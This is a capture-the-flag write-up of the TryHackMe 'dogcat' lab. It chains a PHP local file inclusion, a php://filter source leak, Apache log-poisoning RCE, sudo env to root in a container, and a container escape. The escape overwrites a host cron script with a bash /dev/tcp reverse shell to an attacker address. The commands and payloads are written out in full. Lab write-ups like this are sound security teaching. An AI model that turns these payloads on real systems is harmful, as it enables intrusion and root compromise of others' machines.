# DogCat TRYHACKME lab Writeup — From LFI to Full Root, No Cap 🐕🐈
> **Written by:** `Abhi/AbhiSecOps`

> 🤖 **AI Disclosure:** AI assistance was used for formatting, grammar, and improving the readability of this writeup. The enumeration, exploitation, commands, and findings were performed and verified by me.

**Target:** `10.49.138.99`
**The vibe:** LFI → RCE → Container Escape → Host Root
**Flags secured:** 4/4 💀🚩

---

## TL;DR (the whole chain in one glance)

```
LFI (weak whitelist bypass)
    → arbitrary file read (Flag 1)
    → LFI upgraded to RCE via log poisoning
    → command execution as www-data (Flag 2)
    → sudo -l exposes misconfigured NOPASSWD env
    → root shell INSIDE the container (Flag 3)
    → hijacked backup.sh with a reverse shell
    → host cron ran it as root
    → root shell ON THE HOST (Flag 4)
```

Let's get into it step by step, no filler.

---

## Step 1: Recon — scoping out what we're dealing with

Standard opener:

```bash
rustscan -a 10.49.138.99 --ulimit 5000 -- -sC -sV
```

Two ports open:
- **22** — SSH (OpenSSH 7.6p1)
- **80** — Apache 2.4.38, PHP 7.4.3, page title: `dogcat`

The site itself was barebones — two buttons, "A dog" and "A cat." The second I saw `?view=dog` and `?view=cat` in the URL, my brain went *ding ding ding, that's an LFI parameter if I've ever seen one.*

***An LFI (Local File Inclusion) parameter is an input field or URL variable in a web application that dynamically determines which file to load or display on the server.***

### The stuff that wasted time (but had to be ruled out):
- `whatweb`, `searchsploit php/7.4.3` — nothing useful, that PHP version's too common for a clean CVE hit
- `nikto` scan — just generic missing-security-header noise, no real lead
- `exiftool 2.jpg` — checked the image for hidden metadata/steganography, came back clean (just a normal sRGB profile)
- `ffuf` / `gobuster` with common wordlists — turned up generic 403s (`.htaccess`, `server-status`) and a forbidden `cats/` dir. No hidden gems here. and I also received the flag.php - (Status: 200) [Size: 0] file.


**Takeaway:** when the app's behavior is already screaming a lead at you (that `view=` parameter), don't sink time into heavy dir-busting first — go poke the obvious thing.

---

## Step 2: Confirming the LFI — the `?view=admin` trick

```bash
curl -i -s "http://10.49.138.99/?view=admin"
```

Response included: *"Sorry, only dogs or cats are allowed."* — so the backend is validating the `view` param somehow. LFI confirmed, now just gotta find the bypass.

Tried path traversal next:

```bash
curl -s "http://10.49.138.99/?view=dog/../../../../etc/passwd"
```

This threw a **fatal include error**:
```
Warning: include(dog/../../../../etc/passwd.php): failed to open stream
```

Two huge things dropped out of this error:
1. The backend code is basically: `include($_GET['view'] . ".php");`
2. The whitelist only checks if the string **contains** `"dog"` or `"cat"` anywhere (a substring check, not a prefix check) — which is exactly why `dog/../../../../etc/passwd` slipped through (it has "dog" in it).

---

## Step 3: Pulling Source Code with `php://filter`

Since `.php` kept getting auto-appended, I needed to read the raw source without it executing. Enter the `php://filter` wrapper:

```bash
curl -s "http://10.49.138.99/index.php?view=php://filter/convert.base64-encode/resource=cat/../index"
```

Got a base64 blob back, decoded it, and got the full `index.php` source:

```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
?>
```

**Two things here that were absolute game-changers:**
1. The whitelist is just `strpos()` — trivially bypassable
2. The `$ext` parameter gives **full control** over the file extension — meaning I could strip `.php` off entirely

That `ext` param ended up being the golden ticket to RCE later.

### 🚩 Flag 1

`flag.php` doesn't contain "dog" or "cat" in its name, so I used a path trick to sneak it past the filter:

```bash
curl -s "http://10.49.138.99/index.php?view=php://filter/convert.base64-encode/resource=cat/../flag"
```

Decoded:
```
THM{Th1s_1s_N0t_4_Catdog_********}
```
*The rest is hidden. Go find it yourself — I'm not running a charity here lol. 💀*

---

## Step 4: Turning LFI into RCE — Log Poisoning

The idea: if I can get PHP code to land somewhere in a log file (Apache access log or error log), I can then use the LFI to include that log as if it were PHP — and it'll actually execute.

### The mistakes that ate most of the time (worth mentioning so nobody else repeats them):

**Mistake #1: used double quotes inside the payload**
```bash
curl -s -A "<?php system(\$_GET[\"cmd\"]); ?>" "http://10.49.138.99/"
```
Apache's combined log format already wraps every field in double quotes. When my payload also contained `"`, Apache escaped it to `\"` to keep the log format intact. Result: the log literally stored `\"cmd\"`, which is invalid PHP syntax. And since PHP parses the **entire file** before executing anything, one syntax error anywhere **kills the whole file**. I'd basically permanently corrupted my own access.log (until a log rotation happened).

**Lesson:** always use **single quotes** for the PHP array key when the outer shell string is double-quoted:
```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" "http://10.49.138.99/"
```

**Mistake #2: sent raw unencoded characters in the URL**
Tried poisoning the error log with raw `<`, `>`, and spaces — Apache either rejected it outright (400) or silently dropped it, so the payload never even got logged. Needed proper URL-encoding.

**Mistake #3: kept trusting `access.log` after it was already corrupted**
Once a syntax-breaking line is in there, every future RCE attempt against that same file fails — no matter how many valid lines get added after — until the bad line rotates out. That's when I switched to **error.log**, which was still clean.

### The working approach:

1. Sent a properly-encoded payload so it'd land as a clean "script not found" entry in error.log:
```bash
curl -s "http://10.49.138.99/index.php?view=cat/../../../../var/log/apache2/error.log&ext=" \
  -G --data-urlencode "cmd=id"
```

2. Kept `ext=` **empty** — this stops `.php` from being appended, so error.log gets handed straight to the PHP interpreter as-is.

3. Included error.log via the LFI and got direct command output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmed as www-data!** 🎉

### 🚩 Flag 2

The hint pointed at `/var/www/flag2.txt` — didn't exist. Ran a `find` instead:
```bash
cmd=find / -iname 'flag*' 2>/dev/null
```
Found the real file: `/var/www/flag2_QMW7JvaY2LvK.txt` (random suffix, different from the generic name in the hint).

```
THM{LF1_t0_RC3_******}
```
 *Half the flag is free. The other half? Earn it. 💀*

---

## Step 5: Container Escape — the `sudo -l` Cheat Code

At this point every command still had to go one-by-one through the log-poisoning RCE (no interactive shell yet). First instinct was to chase a Docker socket escape.

### Dead ends that didn't pan out:
- Went looking for `/var/run/docker.sock` — not there
- `find / -name '*.sock'` — nothing
- Checked capabilities (`CapEff`, etc.) — turned out to be a standard unprivileged container, nothing juicy
- Found `/opt/backups` (bind-mounted from the host) holding `backup.sh` and `backup.tar` — figured a symlink trick could work here if it was writable, but it was root-owned and www-data had zero write access

**What actually worked:** running `sudo -l` — which honestly should've been the very first thing checked. It revealed:

```
(root) NOPASSWD: /usr/bin/env
```

Textbook GTFOBins misconfiguration. `env` can spawn arbitrary commands within its own environment, and with NOPASSWD sudo access, that means an instant root shell:

```bash
sudo /usr/bin/env /bin/bash
```

**Root, inside the container. Just like that.**

### 🚩 Flag 3

With root access, went digging through `/opt/backups/backup.tar` (previously read-only). Found a `Dockerfile` inside it with the flag hardcoded right there (baked in at build time):

```dockerfile
RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt
RUN chmod 400 /root/flag3.txt
```

```
THM{D1ff3r3nt_3nv1ronments_******}
```
> *If you're still reading instead of hacking... bro, what are you doing? 💀*

(Funny side note: the same Dockerfile also had Flag 2's content hardcoded in it — nice confirmation of what we'd already extracted via RCE.)

---

## Step 6: Host Escape — Hijacking the Backup Script

Root inside the container was great, but Flag 4 lived on the host. Key observation:

- `/opt/backups/backup.tar`'s timestamp kept refreshing (roughly every ~12 minutes) — meaning something on the **host** was running `backup.sh` **as root** on a schedule
- `backup.sh` just contained: `tar cf /root/container/backup/backup.tar /root/container`

The play: now that I'm root *inside* the container, I can overwrite `backup.sh`. When the host's scheduler runs it again (as root, in the host's own context), my code executes on the host.

### One more dead end here:
- Tried planting a symlink (`ln -sf /`) inside `/var/www/html`, hoping the next backup cycle would traverse into the host's root through it — didn't work, because `tar` without the `-h`/dereference flag doesn't follow symlinks, it just archives the symlink as a symlink. Technically flawed approach.

### What actually worked:

Overwrote `backup.sh` with a reverse shell payload:

```bash
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/8888 0>&1'
```


First, confirmed that the web command execution could straight-up run commands as root (thanks to that `sudo -l` finding):

```bash
curl -s "http://10.49.138.99/index.php?view=cat/../../../../var/log/apache2/error.log&ext=" -G \
--data-urlencode "cmd=sudo /usr/bin/env /usr/bin/id"
```

Came back with:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root via the web RCE itself, no separate shell needed. Then checked the backup script through the same channel:

```bash
curl -s "http://10.49.138.99/index.php?view=cat/../../../../var/log/apache2/error.log&ext=" -G \
--data-urlencode "cmd=sudo /usr/bin/env /bin/bash -c 'cat /opt/backups/backup.sh'"
```

Confirmed it was getting executed periodically with root privileges (on the host).

To dodge all the shell-quoting pain from earlier, base64-encoded the reverse shell script instead of trying to inline it:

```bash
printf '%s\n' '#!/bin/bash' "/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/8888 0>&1'" | base64 -w0
```

Then used the web RCE to decode and overwrite `backup.sh` directly:

```bash
curl -s "http://10.49.138.99/index.php?view=cat/../../../../var/log/apache2/error.log&ext=" -G \
--data-urlencode "cmd=sudo /usr/bin/env /bin/bash -c 'echo <BASE64_PAYLOAD> | base64 -d > /opt/backups/backup.sh'"
```

Started a listener:

```bash
nc -lvnp 8888
```

> **Pro tip:** base64-encoding payloads before shipping them through a web RCE channel is just generally the move — saves you from fighting quotes, spaces, and special characters getting mangled by multiple layers of shell/URL parsing.

Then just waited for the scheduled backup to fire. Once the host's cron ran `backup.sh` as root (since it's a root-owned script on the *host* filesystem), the reverse shell called back **from the host itself** — as root.

### 🚩 Flag 4

```bash
id
cat /root/flag4.txt
```
> 🚩 **Flag:** `THM{████████████}`
>
> *Nice try. The flag isn't going to find itself. 🗿*

Root flag secured, straight off the host. Chain complete. 🎉

---

## Full Exploit Chain at a Glance

| # | Vulnerability | What it got us |
|---|---|---|
| 1 | LFI (weak whitelist — substring check) | Flag 1, source disclosure via `php://filter` |
| 2 | `ext` param override + log poisoning | RCE as `www-data`, Flag 2 |
| 3 | Misconfigured `sudo` (`NOPASSWD: env`) | Root shell inside the container |
| 4 | Dockerfile leaked inside backup.tar | Flag 3 |
| 5 | Root-owned, host-executed backup script | Root shell on the **host**, Flag 4 |

---

## Biggest Takeaways

- **A substring-based whitelist like `containsStr()`** is a huge red flag — always do exact matching or proper sanitization, never "does it contain the word"
- **A "helpful" extension-override feature** (`$ext`) hands the attacker full control over file type — anything user-controlled that touches `include()` is dangerous
- **Run `sudo -l` early** — should be priority #1 when enumerating a box/container, not something to try after chasing Docker sockets for a while
- **Shared/bind-mounted directories that a host cron touches** are a classic escape vector if they're writable and get executed in a root context
- **Quoting matters** when crafting payloads (single vs. double) — one wrong quote can corrupt an entire log file and burn a chunk of your session
